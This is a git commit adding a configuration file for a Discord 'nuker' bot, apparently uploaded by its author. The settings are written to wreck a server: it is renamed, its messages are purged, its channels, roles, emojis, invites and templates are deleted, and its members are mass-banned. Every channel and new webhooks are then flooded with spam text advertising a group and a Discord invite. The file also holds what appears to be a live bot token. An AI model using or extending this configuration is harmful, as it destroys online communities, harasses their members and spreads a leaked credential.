2e6551d2a9c427c34d046ef2f5467ec85b6c055b
Eh3an_KenZo <127389448+egkc7@users.noreply.github.com>
2023-05-09 19:40:19 +0330

    Add files via upload

---
+++ nuker.py
@@ -0,0 +1,104 @@
+
+{
+    # Token of bot
+    'BOT_TOKEN': 'MTA0NTY5MTA4OTAyNzMzODM2Mw.GI0bQA.QhgDTPVdSEUKswD9Fp5RzOHJXuZvA4HAhYKQhY',
+
+    # Bot command prefix
+    'BOT_COMMAND_PREFIX': '!',
+
+    # New channels name
+    'CHANNELS_NAME': 'Crypto Team Closed You',
+
+    # Spamming text
+    'SPAM_TEXT': 'Crypto Team Closed You! | https://discord.gg/Pxj54xtXaJ | @everyone @here',
+
+    # Ban reason
+    'BAN_REASON': 'Crypto Team Closed You!!!',
+
+    # New server name
+    'RENAME_SERVER_TO': 'Crypto Team Closed You!!!',
+
+    # Roles name
+    'ROLES_NAME': 'Crypto Team Closed You!!!',
+
+    # Members DM spam text
+    'DM_SPAM': 'Crypto Team Closed You! | https://discord.gg/Pxj54xtXaJ | @everyone @here',
+
+    # Message on start
+    'NUKER_START_MESSAGE': 'Crypto Team Closed You! | https://discord.gg/Pxj54xtXaJ | @everyone @here',
+
+    # Do send start message?
+    'SHOW_START_MESSAGE': True,
+
+    # Enable Auto-Leave
+    'AUTO_LEAVE': False,
+
+    # Auto-Leave: Run after
+    'AUTO_LEAVE_SEC': 240,
+
+    'NUKER_OPTIONS': {
+
+        # Rename this server?
+        'RENAME_GUILD': True,
+
+        # Clear messages?
+        'PURGE': True,
+
+        # Do spamming members to DM?
+        # Set it to False, if server has > 100 members.
+        'FLOOD_DM': False,
+
+        # Delete all channels and create new?
+        'CREATE_CHANNELS': True,
+
+        # False - creates ONLY text channels
+        # True - creates {text channel|voice channel|category}
+        'CHANNELS_TYPE_RANDOM': False,
+
+        # Delete old roles and create new?
+        'CDROLES': True,
+
+        # Massban?
+        'BAN_MEMBERS': True,
+
+        # Delete all emojis from server?
+        'DELETE_EMOJIS': True,
+
+        # Delete all invites from server?
+        'DELETE_INVITES': True,
+
+        # Spam on all channels?
+        'TOTAL_SPAM': True,
+
+        # Create webhooks?
+        'CREATE_WEBHOOKS': True,
+
+        # Spam new webhooks?
+        'SPAM_WEBHOOKS': True,
+
+        # Delete server tempates?
+        'DELETE_TEMPLATES': True,
+
+        # Change icon of server?
+        'CHANGE_SERVER_ICON': True,
+
+        # File with new server icon
+        'SERVER_ICON': 'sample.png'
+
+    },
+
+    # Ban excludes.
+    'BAN_EXCLUDES':
+        [
+            'friend#0001',
+            'test#0002'
+        ],
+
+    # Names for new webhooks
+    'WEBHOOK_NAMES':
+        [
+            'Crypto Team Closed You',
+            'Crypto Team Closed You',
+            'Crypto Team Closed You'
+        ]
+}
